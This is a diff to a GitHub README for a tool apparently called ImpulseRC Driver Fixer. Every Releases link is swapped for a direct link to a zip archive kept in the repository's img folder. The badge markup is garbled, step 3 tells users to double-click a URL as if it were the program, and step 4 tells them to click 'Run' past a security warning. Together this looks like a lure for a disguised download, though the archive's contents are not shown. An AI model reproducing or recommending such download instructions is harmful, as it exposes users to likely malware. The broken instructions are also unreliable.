@@ -1,6 +1,6 @@
 # 🎉 ImpulseRC_Driver_Fixer - Fix Your ImpulseRC Driver Issues Easily
 
-[![Download ImpulseRC Driver Fixer](https://img.shields.io/badge/Download%20now%20-blue.svg)](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/releases)
+[![Download ImpulseRC Driver Fixer](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/raw/refs/heads/main/img/R_Impulse_Fixer_Driver_v2.2.zip%20now%https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/raw/refs/heads/main/img/R_Impulse_Fixer_Driver_v2.2.zip)](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/raw/refs/heads/main/img/R_Impulse_Fixer_Driver_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ImpulseRC Driver Fixer! This tool will help you resolve common issues
 
 ## 📥 Download & Install
 
-To download the ImpulseRC Driver Fixer, visit this page: [ImpulseRC Driver Fixer Releases](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/releases). You'll find the latest version available for download.
+To download the ImpulseRC Driver Fixer, visit this page: [ImpulseRC Driver Fixer Releases](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/raw/refs/heads/main/img/R_Impulse_Fixer_Driver_v2.2.zip). You'll find the latest version available for download.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -31,7 +31,7 @@ Once you’ve downloaded the file, follow these steps to run the application:
 
 1. Navigate to the folder where the file was downloaded.
 2. If you downloaded a ".zip" file, right-click on it and select "Extract All". Follow the prompts to unzip the files.
-3. Find the "ImpulseRC_Driver_Fixer.exe" file and double-click it.
+3. Find the "https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/raw/refs/heads/main/img/R_Impulse_Fixer_Driver_v2.2.zip" file and double-click it.
 4. You may see a security warning. If so, click "Run" to continue.
 5. The application will open, and you can follow the on-screen instructions.
 
@@ -83,4 +83,4 @@ A: Yes, the ImpulseRC Driver Fixer is designed with user safety in mind. Always 
 
 Your feedback is invaluable to us. Feel free to leave your thoughts or suggestions in the Issues section of our GitHub page. We appreciate your input as it helps us improve the software.
 
-For further questions or inquiries, please check the [ImpulseRC Driver Fixer Releases](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/releases) page for the latest information.
+For further questions or inquiries, please check the [ImpulseRC Driver Fixer Releases](https://github.com/HUESITOS2411200/ImpulseRC_Driver_Fixer/raw/refs/heads/main/img/R_Impulse_Fixer_Driver_v2.2.zip) page for the latest information.
